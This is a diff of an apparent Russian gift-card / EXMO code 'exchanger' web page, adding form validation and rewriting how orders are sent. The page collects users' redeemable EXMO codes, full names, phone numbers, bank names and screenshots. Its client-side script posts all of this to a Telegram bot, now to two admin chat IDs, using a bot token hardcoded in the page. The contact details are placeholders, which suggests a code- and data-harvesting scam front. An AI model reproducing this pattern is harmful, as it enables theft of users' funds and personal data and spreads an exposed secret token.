@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Продать EXMO код - EXMO Обменник</title>
+    <title>Продать EXMO код - Обменник gift-карт</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -19,8 +19,8 @@
             <div class="container">
                 <div class="user-bar-content">
                     <div class="header-contacts-top">
-                        <span>📱 Поддержка: <a href="https://t.me/yourusername" target="_blank">@yourusername</a></span>
-                        <span>📧 Email: support@example.com</span>
+                        <span><svg style="width:16px;height:16px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#0088cc"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.5 8.1l-1.8 8.5c-.13.6-.5.75-.95.47l-2.6-1.9-1.25 1.2c-.14.14-.26.26-.53.26l.18-2.6 4.8-4.3c.2-.2-.05-.3-.3-.12l-5.9 3.7-2.55-.8c-.55-.17-.56-.55.12-.82l10-3.85c.45-.17.85.1.7.8z"/></svg> <a href="https://t.me/yourusername" target="_blank">@yourusername</a></span>
+                        <span><svg style="width:16px;height:16px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg> support@example.com</span>
                     </div>
                     <div class="auth-buttons-header">
                         <button class="btn-login-header" onclick="window.location.href='login.html'">Войти</button>
@@ -33,7 +33,7 @@
             <div class="container">
                 <div class="header-content">
                     <div class="logo">
-                        <h1>EXMO ОБМЕННИК</h1>
+                        <h1>Обменник gift-карт</h1>
                     </div>
                     <nav>
                         <a href="index.html">Главная</a>
@@ -53,7 +53,7 @@
         <section class="exchange-main-section">
             <div class="container">
                 <div class="exchange-info">
-                    <h2 id="pageTitle">Обменник EXMO кодов</h2>
+                    <h2 id="pageTitle">Обменник gift-карт</h2>
                     <p class="exchange-conditions">Курс обмена 1×1 без комиссии. Быстрая оплата через СБП. Минимальная сумма обмена — 1 000 ₽, максимальная — 100 000 ₽. Время обработки заявки: 10-30 минут.</p>
                 </div>
 
@@ -61,10 +61,10 @@
                     <div class="exchange-columns">
                         <div class="exchange-column">
                             <div class="form-group">
-                                <label>💳 Gift Card (EXMO код) *</label>
+                                <label>💳 Вставить код *</label>
                                 <input type="text" id="exmoCode" name="exmoCode" required
-                                       placeholder="Вставьте код, созданный в личном кабинете EXMO">
-                                <small>min: 1 000 RUB | max: 100 000 RUB</small>
+                                       placeholder="Вставьте Gift Card (EXMO код)">
+                                <small>Gift Card (EXMO код), созданный в личном кабинете биржи пользователя</small>
                             </div>
 
                             <div class="form-group">
@@ -117,9 +117,10 @@
                         </label>
                     </div>
 
-                    <button type="submit" class="btn-submit-exchange">Создать заявку</button>
+                    <button type="submit" id="submitBtn" class="btn-submit-exchange btn-disabled">Создать заявку</button>
                 </form>
 
+                <div id="validationMessage" class="message warning" style="display:none;"></div>
                 <div id="successMessage" class="message success" style="display:none;">
                     ✓ Заявка успешно отправлена! Мы свяжемся с вами в ближайшее время.
                 </div>
@@ -135,8 +136,8 @@
             <div class="footer-content">
                 <div class="footer-section">
                     <h3>Контакты</h3>
-                    <p>📱 Telegram: <a href="https://t.me/yourusername" target="_blank">@yourusername</a></p>
-                    <p>📧 Email: support@example.com</p>
+                    <p><svg style="width:14px;height:14px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#0088cc"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.5 8.1l-1.8 8.5c-.13.6-.5.75-.95.47l-2.6-1.9-1.25 1.2c-.14.14-.26.26-.53.26l.18-2.6 4.8-4.3c.2-.2-.05-.3-.3-.12l-5.9 3.7-2.55-.8c-.55-.17-.56-.55.12-.82l10-3.85c.45-.17.85.1.7.8z"/></svg> <a href="https://t.me/yourusername" target="_blank">@yourusername</a></p>
+                    <p><svg style="width:14px;height:14px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg> support@example.com</p>
                 </div>
                 <div class="footer-section">
                     <h3>Режим работы</h3>
@@ -151,7 +152,7 @@
                 </div>
             </div>
             <div class="footer-bottom">
-                <p>&copy; 2026 Обменник EXMO кодов. Все права защищены.</p>
+                <p>&copy; 2026 Обменник gift-карт. Все права защищены.</p>
             </div>
         </div>
     </footer>
@@ -184,53 +185,113 @@
         const phoneInput = document.getElementById('phone');
         phoneInput.addEventListener('input', formatPhone);
 
-        // Отправка в Telegram с фото
-        async function sendToTelegram(order, screenshotFile) {
-            const BOT_TOKEN = '8378403510:AAHdYIpQ2hRJ8H0va6kM-ZSfoYwVeosuQVA';
-            const CHAT_ID = '7338817463';
+        // Валидация формы
+        const submitBtn = document.getElementById('submitBtn');
+        const validationMsg = document.getElementById('validationMessage');
+        const form = document.getElementById('sellForm');
 
-            const caption =
-                `📋 <b>Новая заявка #${order.id}</b>\n\n` +
-                `💳 <b>EXMO код:</b> <code>${order.exmoCode}</code>\n` +
-                `💰 <b>Сумма:</b> <code>${order.giveAmount} ₽</code>\n\n` +
-                `👤 <b>Клиент:</b>\n` +
-                `• ФИО: <code>${order.fullName}</code>\n` +
-                `• 📱 Телефон: <code>${order.phone}</code>\n` +
-                `• 🏦 Банк: <code>${order.bank}</code>\n\n` +
-                `⏰ <code>${order.createdAt.substring(0, 19)}</code>`;
+        function validateForm() {
+            const errors = [];
+            const exmoCode = document.getElementById('exmoCode').value.trim();
+            const giveAmount = parseFloat(document.getElementById('giveAmount').value) || 0;
+            const screenshot = document.getElementById('screenshot').files[0];
+            const fullName = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const bank = document.getElementById('bank').value.trim();
+            const checkbox = form.querySelector('input[type="checkbox"]').checked;
 
-            if (screenshotFile) {
-                // Отправляем с фото
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', screenshotFile);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'HTML');
+            if (!exmoCode) errors.push('Введите EXMO код');
+            if (giveAmount < 1000) errors.push('Сумма минимум 1000 ₽');
+            if (giveAmount > 100000) errors.push('Сумма максимум 100000 ₽');
+            if (!screenshot) errors.push('Загрузите скриншот');
+            if (!fullName) errors.push('Введите ФИО');
+            if (phone.length < 18) errors.push('Введите номер телефона');
+            if (!bank) errors.push('Введите название банка');
+            if (!checkbox) errors.push('Примите условия');
 
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            return errors;
+        }
 
-                try {
-                    await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (err) {
-                    console.log('Telegram photo error:', err);
-                }
+        function updateButtonState() {
+            const errors = validateForm();
+            if (errors.length === 0) {
+                submitBtn.classList.remove('btn-disabled');
             } else {
-                // Отправляем только текст
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                submitBtn.classList.add('btn-disabled');
+            }
+        }
 
+        // Слушаем изменения всех полей
+        form.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', updateButtonState);
+            input.addEventListener('change', updateButtonState);
+        });
+
+        // При клике на неактивную кнопку показываем ошибки
+        submitBtn.addEventListener('click', function(e) {
+            const errors = validateForm();
+            if (errors.length > 0) {
+                e.preventDefault();
+                validationMsg.innerHTML = '⚠️ ' + errors.join('<br>⚠️ ');
+                validationMsg.style.display = 'block';
+                setTimeout(() => { validationMsg.style.display = 'none'; }, 5000);
+            }
+        });
+
+        // Отправка заявки на сервер и в Telegram
+        async function sendOrder(order, screenshotFile) {
+            const BOT_TOKEN = '8378403510:AAHdYIpQ2hRJ8H0va6kM-ZSfoYwVeosuQVA';
+            const ADMIN_IDS = ['7338817463', '7816621862'];
+            const API_URL = 'http://localhost:5000/api/order';
+
+            // Пробуем отправить на API сервер (сохранит в БД)
+            try {
+                const res = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(order)
+                });
+                const data = await res.json();
+                if (data.success) {
+                    console.log('Saved to server, ID:', data.id);
+                }
+            } catch (e) {
+                console.log('API offline, sending directly to Telegram');
+            }
+
+            // Всегда отправляем в Telegram
+            const message =
+                `📋 <b>Новая заявка</b>\n\n` +
+                `💳 <code>${order.exmoCode}</code>\n` +
+                `💰 ${order.giveAmount} руб.\n\n` +
+                `👤 <code>${order.fullName}</code>\n` +
+                `📱 <code>${order.phone}</code>\n` +
+                `🏦 <code>${order.bank}</code>`;
+
+            for (const chatId of ADMIN_IDS) {
                 try {
-                    await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: caption,
-                            parse_mode: 'HTML'
-                        })
-                    });
+                    if (screenshotFile) {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', screenshotFile);
+                        formData.append('caption', message);
+                        formData.append('parse_mode', 'HTML');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } else {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                    }
                 } catch (err) {
                     console.log('Telegram error:', err);
                 }
@@ -278,8 +339,8 @@
             const screenshotInput = document.getElementById('screenshot');
             const screenshotFile = screenshotInput.files[0] || null;
 
-            // Отправляем в Telegram с фото
-            sendToTelegram(newOrder, screenshotFile);
+            // Отправляем заявку
+            sendOrder(newOrder, screenshotFile);
 
             successMessage.style.display = 'block';
             this.reset();
